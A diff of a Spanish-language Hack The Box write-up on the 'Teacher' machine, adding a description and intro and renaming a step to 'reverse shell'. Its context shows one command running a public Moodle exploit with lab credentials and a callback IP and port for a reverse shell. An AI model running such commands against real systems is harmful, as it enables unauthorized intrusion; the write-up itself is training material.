@@ -1,13 +1,13 @@
 ---
 title: "HTB write-up: Teacher"
 date: 2019-04-20T18:48:57-05:00
-description: "AAAA"
+description: "Teacher is a machine that remember us about how not writing scripts."
 tags: ["hackthebox", "htb", "boot2root", "pentesting", "sudoers", "RCE"]
 categories: ["htb", "pentesting"]
 
 ---
 
-AAAA
+Teacher fue una maquina que resulto peculiarmente interesante acerca de como debemos mantener nuestras aplicaciones actualizadas para evitar exploits, no dejar cuentas de sistema operativo dentro de bases de datos de aplicativos y leer un buen libro de como programar en bash.
 
 <!--more-->
 
@@ -1625,7 +1625,7 @@ Shellcodes: No Result
 
 Guardamos el exploit y lo ejecutamos con los parámetros necesarios, no sin antes abrir un listener en nuestra máquina:
 
-Para realizar el RCE:
+Para realizar la reverse shell:
 
 ```text
 xbytemx@laptop:~/htb/teacher$ php 46551.php url=http://10.10.10.153/moodle/ user=Giovanni pass=Th4C00lTheacha# ip=10.10.13.42 port=3001 course=2 debug=true
